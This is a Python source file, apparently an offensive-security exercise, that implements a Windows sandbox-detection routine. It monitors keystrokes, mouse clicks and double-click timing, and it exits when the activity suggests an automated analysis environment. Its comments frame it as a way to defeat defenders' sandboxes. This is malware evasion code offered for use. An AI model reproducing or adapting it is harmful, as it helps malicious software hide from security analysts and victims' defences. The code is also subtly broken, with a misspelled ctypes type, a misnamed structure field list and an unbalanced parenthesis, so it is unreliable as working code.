from ctypes import byref, c_unit, c_ulong, sizeof, Structure, windll

import random
import sys
import time
import win32api

class LAST_INPUT_INFO(Structure):
    fields_=[
        ('cbSize', c_unit),
        # Timestamp
        ('dwTime', c_ulong)
    ]

def get_last_input():
    ''' Determine user inactivity based on machine and user intel.'''
    struct_lastinputinfo = LAST_INPUT_INFO()
    # Initialize the variable to the size of the structure before calling
    struct_lastinputinfo.cbSize = sizeof(LAST_INPUT_INFO)
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    # How long the machine has been running?
    run_time = windll.kernel32.GetTickCount()
    # When was the last input?
    elapsed  = run_time - struct_lastinputinfo.dwTime
    print(f"[*] It's been {elapsed} milliseconds since the last event.")
    return elapsed

class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes    = 0
        self.mouse_clicks  = 0

    def get_key_press(self):
        ''' Checks for keypresses or mouse clicks.'''
        # Iterate over the range of valid input keys
        for i in range(0,0xff):
            # Has the key been pressed?
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:
                # 0x1 is the virtual key code for a left-mouse-button click
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i >32 and i <127:
                    self.keystrokes += 1
        return None


    def detect(self):
        previous_timestamp     = None
        first_double_click     = None
        double_click_threshold = 0.35

        # Parameters to determine sandbox detection. 
        # MODIFY ACCORDINGLY:
        max_double_clicks   = 10
        max_keystrokes      = random.randint(10,25)
        max_mouse_clicks    = random.randint(5,25)
        # 30 secs of inactivity 
        max_input_threshold = 30000

        last_input     = get_last_input()
        if last_input >= max_input_threshold:
            sys.exit(0)
        
        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp

                if elapsed <= double_click_threshold:
                    self.mouse_clicks  -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        # Is the user trying to deceit us by streaming click events and thwart our sandbox detection? Not today, Satan. 
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <=
                                max_double_clicks*double_click_threshold)):
                                sys.exit(0)
                
                if (self.keystrokes    >= max_keystrokes and
                    self.double_clicks >= max_double_clicks and
                    self.mouse_clicks  >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

def run():
    d = Detector()
    d.detect()
    print('okay.')


if __name__ == '__main__':
    run()
